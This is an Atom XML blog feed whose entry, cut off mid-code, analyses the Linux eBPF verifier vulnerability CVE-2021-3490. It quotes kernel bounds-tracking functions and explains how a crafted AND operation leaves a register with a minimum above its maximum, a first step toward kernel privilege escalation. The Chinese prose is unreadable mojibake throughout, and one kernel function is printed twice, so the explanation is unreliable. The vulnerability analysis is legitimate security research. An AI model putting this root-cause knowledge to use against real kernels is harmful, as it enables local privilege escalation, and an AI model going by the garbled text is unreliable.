<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://cv196082.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://cv196082.gitee.io/"/>
  <updated>2023-08-12T13:30:19.813Z</updated>
  <id>https://cv196082.gitee.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2021-3490</title>
    <link href="https://cv196082.gitee.io/2023/08/12/CVE-2021-3490/"/>
    <id>https://cv196082.gitee.io/2023/08/12/CVE-2021-3490/</id>
    <published>2023-08-12T13:30:19.000Z</published>
    <updated>2023-08-12T13:30:19.813Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘ä¸ºäº†æ‰¾å·¥ä½œç–¯ç‹‚å¤ç°CVEæ˜¯çœŸçš„å¤ªéš¾äº†ğŸ˜­ï¼Œä»Šå¤©æ‰å‘ç°æˆ‘å·¥ä½æ—è¾¹çš„å±…ç„¶æ˜¯fmyyçˆ·ğŸ˜­ï¼Œå±äºæ˜¯ç»™è·ªäº†ã€‚</p><p>è¿™æ¬¡å¤ç°çš„è¿™ä¸ªCVEæ˜¯ä¸€ä¸ªå…³äºebpfçš„æ¼æ´ï¼Œå¦‚æœå„ä½æ²¡æœ‰ç›¸å…³çš„åŸºç¡€å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« <a href="https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/">CVE-2017-16995</a>ï¼Œå¹¶ä¸”è¿™æ¬¡è¿™ä¸ªCVEçš„åˆ©ç”¨æ–¹æ³•å’Œä»¥å‰åšçš„ä¸€é“é¢˜å¯ä»¥è¯´æ˜¯ä¸€æ‘¸ä¸€æ ·ï¼Œæ‰€ä»¥è¿™æ¬¡ä¸ä¼šè¯¦ç»†çš„ä»‹ç»åˆ©ç”¨æ–¹æ³•è€Œæ˜¯æ›´å€¾å‘äºè§£é‡Šå¦‚ä½•æ„é€ ä¹‹ç±»çš„ï¼Œå…·ä½“çš„åˆ©ç”¨æ–¹æ³•å¯ä»¥å»çœ‹<a href="https://cv196082.gitee.io/2023/01/06/d3bpf/">d3bpf</a>ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æœ‰è¿‡ebpfçš„åŸºç¡€éƒ½çŸ¥é“åœ¨è½½å…¥ä¸€ä¸ªebpfç¨‹åºçš„æ—¶å€™ä¼šå¯¹æ¯æ¡æŒ‡ä»¤è¿›è¡Œæ£€æŸ¥ï¼Œè€Œæ£€æŸ¥çš„å‡½æ•°å°±åœ¨<code>do_check</code>ä¸­ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªALUè¿ç®—çš„è¯åˆ™ä¼šè¿›å…¥<code>check_alu_op</code>è¿›è¡Œè¿›ä¸€æ­¥æ£€æŸ¥ï¼Œå¦‚æœæˆ‘ä»¬çš„è¿ç®—æ–¹å¼æ˜¯<code>and/or/xor</code>ä¸€ç±»çš„åˆ™ä¼šè¿›å…¥<code>adjust_reg_min_max_vals</code>å‡½æ•°è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€æŸ¥ï¼Œåœ¨å‡½æ•°ä¸­æœ€åä¼šè°ƒç”¨åˆ°<code> adjust_scalar_min_max_vals</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> BPF_ADD:</span><br><span class="line">scalar32_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">dst_reg-&gt;var_off = tnum_add(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_SUB:</span><br><span class="line">scalar32_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">dst_reg-&gt;var_off = tnum_sub(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MUL:</span><br><span class="line">dst_reg-&gt;var_off = tnum_mul(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_mul(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_mul(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_AND:</span><br><span class="line">dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_and(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_and(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_OR:</span><br><span class="line">dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_XOR:</span><br><span class="line">dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­ä¼šæ ¹æ®<code>opcode</code>çš„ä¸åŒè€Œè¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼Œä»¥andä¸ºä¾‹ï¼Œå…¶ä¼šè°ƒç”¨<code>scalar32_min_max_and</code>å’Œ<code>scalar_min_max_and</code>è®¡ç®—32ä½ä»¥åŠ64ä½çš„è¾¹ç•Œå€¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">  <span class="keyword">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);</span><br><span class="line">  s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">  u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Assuming scalar64_min_max_and will be called so its safe</span></span><br><span class="line"><span class="comment"> * to skip updating register for known 32-bit case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">if</span> (src_known &amp;&amp; dst_known)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  dst_reg-&gt;u32_min_value = var32_off.value;</span><br><span class="line">  dst_reg-&gt;u32_max_value = min(dst_reg-&gt;u32_max_value, umax_val);</span><br><span class="line">  <span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">    dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;</span><br><span class="line">    dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ<code>tnum_subreg_is_const</code>å‡½æ•°å¾—åˆ°çš„æ˜¯å½“å‰å¯„å­˜å™¨çš„ä½32ä½å€¼æ˜¯å¦æ˜¯<code>known</code>çš„ï¼Œæ ¹æ®å‡½æ•°çš„æµç¨‹å¦‚æœä¸¤ä¸ªå¯„å­˜å™¨çš„ä½32ä½éƒ½ä¸º<code>known</code>åˆ™ç›´æ¥returnã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€è§‚å¯Ÿè¿™ä¸ªå‡½æ•°ï¼Œé¦–å…ˆåˆ™æ˜¯åˆ¤æ–­äº†64ä½æ˜¯å¦ä¸º<code>known</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸¤ä¸ªå¯„å­˜å™¨éƒ½æ˜¯<code>known</code>çš„çŠ¶æ€çš„è¯ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä¼šå°†<code>imm</code>èµ‹å€¼ç»™å¯„å­˜å™¨å†…çš„å¤šä¸ªæˆå‘˜ã€‚å¦‚æœæ˜¯è¿™æ ·è¿è¡Œçš„è¯ï¼Œé‚£ä¹ˆæ˜¯æ­£å¸¸çš„è¿è¡Œçš„ã€‚ä¸è¿‡å¯ä»¥çœ‹åˆ°çš„æ˜¯è¿™ä¸ª<code>scalar32_min_max_and</code>å‡½æ•°ä¸­å–<code>known</code>çš„å‡½æ•°ä½¿ç”¨çš„æ˜¯<code>tnum_subreg_is_const</code>ï¼Œç„¶è€Œè¿™ä¸ªå‡½æ•°åªä¼šéªŒè¯ä½32ä½çš„<code>mask</code>å€¼ï¼Œå¦‚æœæ­¤æ—¶å­˜åœ¨ä»¥ä¸‹ä¸¤ä¸ªå¯„å­˜å™¨ä¼šæ˜¯è¿™æ ·çš„æ•ˆæœã€‚<code>R1=&#123;.value=0x1, .mask=0xffffffff00000000&#125;</code>ï¼Œ<code>R2=&#123;.value=0x100000002, .mask=0x0&#125;</code>å¦‚æœä¸¤ä¸ªå¯„å­˜å™¨è¿›è¡Œandè¿ç®—çš„è¯ï¼Œé‚£ä¹ˆç»“æœå°±ä¸º<code>R1=&#123;.value=0x0, .mask=0x100000000&#125;</code>ã€‚æ­¤æ—¶åœ¨<code>scalar32_min_max_and</code>å‡½æ•°ä¸­æ˜¯ä¼šç›´æ¥<code>return</code>çš„ï¼Œéšåç«‹é©¬è¿›å…¥<code>scalar_min_max_and</code>å‡½æ•°ä¸­ï¼Œå¹¶ä¸”å› ä¸º<code>dst_known = 0</code>å¯¼è‡´ä¸ä¼šè¿›å…¥<code>if</code>è¯­å¥ï¼Œè¿›å…¥ä¸‹é¢çš„æµç¨‹ã€‚æœ€ç»ˆä¼šè¿›å…¥åˆ°<code>scalar32_min_max_and</code>ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg32_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">reg-&gt;s32_min_value = <span class="keyword">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line"><span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">reg-&gt;s32_max_value = <span class="keyword">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">reg-&gt;u32_min_value = <span class="keyword">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line"> (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg64_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">reg-&gt;smin_value = <span class="keyword">max_t</span>(s64, reg-&gt;smin_value,</span><br><span class="line">reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));</span><br><span class="line"><span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">reg-&gt;smax_value = <span class="keyword">min_t</span>(s64, reg-&gt;smax_value,</span><br><span class="line">reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));</span><br><span class="line">reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);</span><br><span class="line">reg-&gt;umax_value = min(reg-&gt;umax_value,</span><br><span class="line">      reg-&gt;var_off.value | reg-&gt;var_off.mask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">__update_reg32_bounds(reg);</span><br><span class="line">__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°å°±æ˜¯å¯¹<code>dst_reg</code>è¿›è¡Œäº†ä¸¤æ¬¡æ›´æ–°è¾¹ç•Œçš„æ•ˆæœï¼Œè¿™é‡Œä¸»è¦å…³æ³¨32ä½çš„å¤„ç†ã€‚é¦–å…ˆå°†æœ‰ç¬¦å·çš„æœ€å°å€¼èµ‹å€¼ä¸ºæœ‰ç¬¦å·çš„æœ€å°å€¼å’ŒçœŸå®å€¼ä¸­çš„æœ€å¤§å€¼ï¼Œç„¶åå°±æ˜¯å°†æœ‰ç¬¦å·çš„æœ€å¤§å€¼èµ‹å€¼ä¸ºæœ‰ç¬¦å·çš„æœ€å¤§å€¼å’ŒçœŸå®å€¼ä¸­æœ€å°å€¼ã€‚åé¢æ— ç¬¦å·å’Œä¸Šè¿°ç±»ä¼¼ã€‚</p><p>ä¾æ—§æŒ‰ç…§ä¸Šé¢çš„ä¾‹å­æ¥çœ‹ï¼Œå› ä¸ºåœ¨<code>scalar32_min_max_and</code>å‡½æ•°ä¸­å¹¶æ²¡æœ‰å¯¹32ä½çš„è¾¹ç•Œå€¼åšä»»ä½•åˆå§‹åŒ–æ‰€ä»¥æœ€ç»ˆçš„æ•ˆæœä¸ºæœ€å°è¾¹ç•Œå€¼ä¸º1ï¼Œæœ€å¤§è¾¹ç•Œå€¼ä¸º0ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> ___mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">reg-&gt;smin_value = (s64)imm;</span><br><span class="line">reg-&gt;smax_value = (s64)imm;</span><br><span class="line">reg-&gt;umin_value = imm;</span><br><span class="line">reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line"><span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">       offsetof(struct bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_reg_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct bpf_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">off_reg.type = SCALAR_VALUE;</span><br><span class="line">__mark_reg_known(&amp;off_reg, insn-&gt;imm);</span><br><span class="line">src_reg = &amp;off_reg;</span><br><span class="line"><span class="keyword">if</span> (ptr_reg) <span class="comment">/* pointer += K */</span></span><br><span class="line">  <span class="keyword">return</span> adjust_ptr_min_max_vals(env, insn,</span><br><span class="line">                                 ptr_reg, src_reg);</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å°±æ˜¯ç»™<code>src_reg</code>è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œå¯ä»¥çœ‹åˆ°å…¶æœ‰ç¬¦å·æ— ç¬¦å·æœ€å¤§å€¼æœ€å°å€¼éƒ½è¢«èµ‹å€¼ä¸ºäº†1ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">__reg_deduce_bounds(dst_reg);</span><br><span class="line">__reg_bound_offset(dst_reg);</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”åœ¨<code>adjust_scalar_min_max_vals</code>å‡½æ•°çš„æœ«å°¾ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼Œé¦–å…ˆåˆä¼šæ‰§è¡Œ<code>__update_reg_bounds</code>å‡½æ•°æ›´æ–°ä¸€ä¸‹è¾¹ç•Œå€¼ï¼Œè®¡ç®—ä¸€ä¸‹ä¼šå‘ç°å…¶å®ç»“æœå¹¶ä¸ä¼šæ”¹å˜ã€‚ä¸è¿‡å¦‚æœæ­¤æ—¶æˆ‘ä»¬å†æ¬¡æ„é€ ä¸€ä¸ªæœ€å°è¾¹ç•Œå€¼ä¸º0ï¼Œæœ€å¤§è¾¹ç•Œå€¼ä¸º1ï¼Œå¹¶ä¸”è¿è¡Œæ—¶å€¼ä¸º0çš„å¯„å­˜å™¨ï¼Œå†è®©ä¸¤ä¸ªå¯„å­˜å™¨ç›¸åŠ ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span 